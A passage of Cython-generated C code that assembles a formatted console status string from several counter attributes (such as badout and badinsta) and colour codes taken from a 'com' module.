          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_9);
          __Pyx_INCREF(__pyx_t_10);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_9, function);
        }
      }
      __pyx_t_8 = (__pyx_t_10) ? __Pyx_PyObject_CallOneArg(__pyx_t_9, __pyx_t_10) : __Pyx_PyObject_CallNoArg(__pyx_t_9);
      __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
      if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __pyx_t_9 = __Pyx_PyObject_FormatSimple(__pyx_t_8, __pyx_empty_unicode); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_9) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_9) : __pyx_t_7;
      __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_9);
      __Pyx_GIVEREF(__pyx_t_9);
      PyTuple_SET_ITEM(__pyx_t_5, 19, __pyx_t_9);
      __pyx_t_9 = 0;
      __Pyx_INCREF(__pyx_kp_u__5);
      __pyx_t_6 += 1;
      __Pyx_GIVEREF(__pyx_kp_u__5);
      PyTuple_SET_ITEM(__pyx_t_5, 20, __pyx_kp_u__5);
      __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_com); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_8);
      __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_blodk); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_10);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __pyx_t_8 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_10))) {
        __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_10);
        if (likely(__pyx_t_8)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_10);
          __Pyx_INCREF(__pyx_t_8);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_10, function);
        }
      }
      __pyx_t_9 = (__pyx_t_8) ? __Pyx_PyObject_CallOneArg(__pyx_t_10, __pyx_t_8) : __Pyx_PyObject_CallNoArg(__pyx_t_10);
      __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
      if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __pyx_t_10 = __Pyx_PyObject_FormatSimple(__pyx_t_9, __pyx_empty_unicode); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_10);
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_10) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_10) : __pyx_t_7;
      __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_10);
      __Pyx_GIVEREF(__pyx_t_10);
      PyTuple_SET_ITEM(__pyx_t_5, 21, __pyx_t_10);
      __pyx_t_10 = 0;
      __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_badout); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_10);
      __pyx_t_9 = __Pyx_PyObject_FormatSimple(__pyx_t_10, __pyx_empty_unicode); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_9) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_9) : __pyx_t_7;
      __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_9);
      __Pyx_GIVEREF(__pyx_t_9);
      PyTuple_SET_ITEM(__pyx_t_5, 22, __pyx_t_9);
      __pyx_t_9 = 0;
      __Pyx_GetModuleGlobalName(__pyx_t_10, __pyx_n_s_com); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_10);
      __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_t_10, __pyx_n_s_A); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __pyx_t_10 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_8))) {
        __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_8);
        if (likely(__pyx_t_10)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_8);
          __Pyx_INCREF(__pyx_t_10);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_8, function);
        }
      }
      __pyx_t_9 = (__pyx_t_10) ? __Pyx_PyObject_CallOneArg(__pyx_t_8, __pyx_t_10) : __Pyx_PyObject_CallNoArg(__pyx_t_8);
      __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
      if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __pyx_t_8 = __Pyx_PyObject_FormatSimple(__pyx_t_9, __pyx_empty_unicode); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_8) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_8) : __pyx_t_7;
      __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_8);
      __Pyx_GIVEREF(__pyx_t_8);
      PyTuple_SET_ITEM(__pyx_t_5, 23, __pyx_t_8);
      __pyx_t_8 = 0;
      __Pyx_INCREF(__pyx_kp_u__6);
      __pyx_t_6 += 1;
      __Pyx_GIVEREF(__pyx_kp_u__6);
      PyTuple_SET_ITEM(__pyx_t_5, 24, __pyx_kp_u__6);
      __Pyx_GetModuleGlobalName(__pyx_t_9, __pyx_n_s_com); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_9);
      __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_t_9, __pyx_n_s_red); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_10);
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __pyx_t_9 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_10))) {
        __pyx_t_9 = PyMethod_GET_SELF(__pyx_t_10);
        if (likely(__pyx_t_9)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_10);
          __Pyx_INCREF(__pyx_t_9);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_10, function);
        }
      }
      __pyx_t_8 = (__pyx_t_9) ? __Pyx_PyObject_CallOneArg(__pyx_t_10, __pyx_t_9) : __Pyx_PyObject_CallNoArg(__pyx_t_10);
      __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
      if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __pyx_t_10 = __Pyx_PyObject_FormatSimple(__pyx_t_8, __pyx_empty_unicode); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_10);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_10) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_10) : __pyx_t_7;
      __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_10);
      __Pyx_GIVEREF(__pyx_t_10);
      PyTuple_SET_ITEM(__pyx_t_5, 25, __pyx_t_10);
      __pyx_t_10 = 0;
      __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_badinsta); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_10);
      __pyx_t_8 = __Pyx_PyObject_FormatSimple(__pyx_t_10, __pyx_empty_unicode); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_8) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_8) : __pyx_t_7;
      __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_8);
      __Pyx_GIVEREF(__pyx_t_8);
      PyTuple_SET_ITEM(__pyx_t_5, 26, __pyx_t_8);
      __pyx_t_8 = 0;
      __Pyx_GetModuleGlobalName(__pyx_t_10, __pyx_n_s_com); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_10);
      __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_t_10, __pyx_n_s_A); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __pyx_t_10 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_9))) {
        __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_9);
        if (likely(__pyx_t_10)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_9);
          __Pyx_INCREF(__pyx_t_10);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_9, function);
        }
      }
      __pyx_t_8 = (__pyx_t_10) ? __Pyx_PyObject_CallOneArg(__pyx_t_9, __pyx_t_10) : __Pyx_PyObject_CallNoArg(__pyx_t_9);
      __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
      if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __pyx_t_9 = __Pyx_PyObject_FormatSimple(__pyx_t_8, __pyx_empty_unicode); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_9) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_9) : __pyx_t_7;
      __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_9);
      __Pyx_GIVEREF(__pyx_t_9);
      PyTuple_SET_ITEM(__pyx_t_5, 27, __pyx_t_9);
      __pyx_t_9 = 0;
      __Pyx_INCREF(__pyx_kp_u__4);
      __pyx_t_6 += 2;
      __Pyx_GIVEREF(__pyx_kp_u__4);
      PyTuple_SET_ITEM(__pyx_t_5, 28, __pyx_kp_u__4);
      __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_com); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_8);
      __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_blodk); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_10);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __pyx_t_8 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_10))) {
        __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_10);
        if (likely(__pyx_t_8)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_10);
          __Pyx_INCREF(__pyx_t_8);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_10, function);
        }
      }
      __pyx_t_9 = (__pyx_t_8) ? __Pyx_PyObject_CallOneArg(__pyx_t_10, __pyx_t_8) : __Pyx_PyObject_CallNoArg(__pyx_t_10);
      __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
      if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __pyx_t_10 = __Pyx_PyObject_FormatSimple(__pyx_t_9, __pyx_empty_unicode); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_10);
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_10) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_10) : __pyx_t_7;
      __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_10);
      __Pyx_GIVEREF(__pyx_t_10);
      PyTuple_SET_ITEM(__pyx_t_5, 29, __pyx_t_10);
      __pyx_t_10 = 0;
      __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_badighot); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_10);
      __pyx_t_9 = __Pyx_PyObject_FormatSimple(__pyx_t_10, __pyx_empty_unicode); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_9) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_9) : __pyx_t_7;
      __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_9);
      __Pyx_GIVEREF(__pyx_t_9);
      PyTuple_SET_ITEM(__pyx_t_5, 30, __pyx_t_9);
      __pyx_t_9 = 0;
      __Pyx_GetModuleGlobalName(__pyx_t_10, __pyx_n_s_com); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_10);
      __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_t_10, __pyx_n_s_A); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __pyx_t_10 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_8))) {
        __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_8);
        if (likely(__pyx_t_10)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_8);
          __Pyx_INCREF(__pyx_t_10);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_8, function);
        }
      }
      __pyx_t_9 = (__pyx_t_10) ? __Pyx_PyObject_CallOneArg(__pyx_t_8, __pyx_t_10) : __Pyx_PyObject_CallNoArg(__pyx_t_8);
      __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
      if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __pyx_t_8 = __Pyx_PyObject_FormatSimple(__pyx_t_9, __pyx_empty_unicode); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_8) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_8) : __pyx_t_7;
      __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_8);
      __Pyx_GIVEREF(__pyx_t_8);
      PyTuple_SET_ITEM(__pyx_t_5, 31, __pyx_t_8);
      __pyx_t_8 = 0;
      __Pyx_INCREF(__pyx_kp_u__5);
      __pyx_t_6 += 1;
      __Pyx_GIVEREF(__pyx_kp_u__5);
      PyTuple_SET_ITEM(__pyx_t_5, 32, __pyx_kp_u__5);
      __Pyx_GetModuleGlobalName(__pyx_t_9, __pyx_n_s_com); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_9);
      __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_t_9, __pyx_n_s_blodk); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_10);
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __pyx_t_9 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_10))) {
        __pyx_t_9 = PyMethod_GET_SELF(__pyx_t_10);
        if (likely(__pyx_t_9)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_10);
          __Pyx_INCREF(__pyx_t_9);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_10, function);
        }
      }
      __pyx_t_8 = (__pyx_t_9) ? __Pyx_PyObject_CallOneArg(__pyx_t_10, __pyx_t_9) : __Pyx_PyObject_CallNoArg(__pyx_t_10);
      __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
      if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __pyx_t_10 = __Pyx_PyObject_FormatSimple(__pyx_t_8, __pyx_empty_unicode); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_10);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_10) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_10) : __pyx_t_7;
      __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_10);
      __Pyx_GIVEREF(__pyx_t_10);
      PyTuple_SET_ITEM(__pyx_t_5, 33, __pyx_t_10);
      __pyx_t_10 = 0;
      __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_badigout); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_10);
      __pyx_t_8 = __Pyx_PyObject_FormatSimple(__pyx_t_10, __pyx_empty_unicode); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_8) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_8) : __pyx_t_7;
      __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_8);
      __Pyx_GIVEREF(__pyx_t_8);
      PyTuple_SET_ITEM(__pyx_t_5, 34, __pyx_t_8);
      __pyx_t_8 = 0;
      __Pyx_GetModuleGlobalName(__pyx_t_10, __pyx_n_s_com); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_10);
      __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_t_10, __pyx_n_s_A); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __pyx_t_10 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_9))) {
        __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_9);
        if (likely(__pyx_t_10)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_9);
          __Pyx_INCREF(__pyx_t_10);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_9, function);
        }
      }
      __pyx_t_8 = (__pyx_t_10) ? __Pyx_PyObject_CallOneArg(__pyx_t_9, __pyx_t_10) : __Pyx_PyObject_CallNoArg(__pyx_t_9);
      __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
      if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __pyx_t_9 = __Pyx_PyObject_FormatSimple(__pyx_t_8, __pyx_empty_unicode); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_9) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_9) : __pyx_t_7;
      __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_9);
      __Pyx_GIVEREF(__pyx_t_9);
      PyTuple_SET_ITEM(__pyx_t_5, 35, __pyx_t_9);
      __pyx_t_9 = 0;
      __Pyx_INCREF(__pyx_kp_u__6);
      __pyx_t_6 += 1;
      __Pyx_GIVEREF(__pyx_kp_u__6);
      PyTuple_SET_ITEM(__pyx_t_5, 36, __pyx_kp_u__6);
      __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_com); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_8);
      __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_brt); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_10);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __pyx_t_8 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_10))) {
        __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_10);
        if (likely(__pyx_t_8)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_10);
          __Pyx_INCREF(__pyx_t_8);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_10, function);
        }
      }
      __pyx_t_9 = (__pyx_t_8) ? __Pyx_PyObject_CallOneArg(__pyx_t_10, __pyx_t_8) : __Pyx_PyObject_CallNoArg(__pyx_t_10);
      __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
      if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __pyx_t_10 = __Pyx_PyObject_FormatSimple(__pyx_t_9, __pyx_empty_unicode); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_10);
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_10) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_10) : __pyx_t_7;
      __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_10);
      __Pyx_GIVEREF(__pyx_t_10);
      PyTuple_SET_ITEM(__pyx_t_5, 37, __pyx_t_10);
      __pyx_t_10 = 0;
      __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_loob); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_10);
      __pyx_t_9 = __Pyx_PyObject_FormatSimple(__pyx_t_10, __pyx_empty_unicode); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_9) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_9) : __pyx_t_7;
      __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_9);
      __Pyx_GIVEREF(__pyx_t_9);
      PyTuple_SET_ITEM(__pyx_t_5, 38, __pyx_t_9);
      __pyx_t_9 = 0;
      __Pyx_GetModuleGlobalName(__pyx_t_10, __pyx_n_s_com); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_10);
      __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_t_10, __pyx_n_s_A); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __pyx_t_10 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_8))) {
        __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_8);
        if (likely(__pyx_t_10)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_8);
          __Pyx_INCREF(__pyx_t_10);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_8, function);
        }
      }
      __pyx_t_9 = (__pyx_t_10) ? __Pyx_PyObject_CallOneArg(__pyx_t_8, __pyx_t_10) : __Pyx_PyObject_CallNoArg(__pyx_t_8);
      __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
      if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __pyx_t_8 = __Pyx_PyObject_FormatSimple(__pyx_t_9, __pyx_empty_unicode); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_8) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_8) : __pyx_t_7;
      __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_8);
      __Pyx_GIVEREF(__pyx_t_8);
      PyTuple_SET_ITEM(__pyx_t_5, 39, __pyx_t_8);
      __pyx_t_8 = 0;
      __Pyx_INCREF(__pyx_kp_u__7);
      __pyx_t_7 = (65535 > __pyx_t_7) ? 65535 : __pyx_t_7;
      __pyx_t_6 += 1;
      __Pyx_GIVEREF(__pyx_kp_u__7);
      PyTuple_SET_ITEM(__pyx_t_5, 40, __pyx_kp_u__7);
      __Pyx_GetModuleGlobalName(__pyx_t_9, __pyx_n_s_com); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_9);
      __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_t_9, __pyx_n_s_brt); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 430, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_10);
      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      __pyx_t_9 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_10))) {
        __pyx_t_9 = PyMethod_GET_SELF(__pyx_t_10);
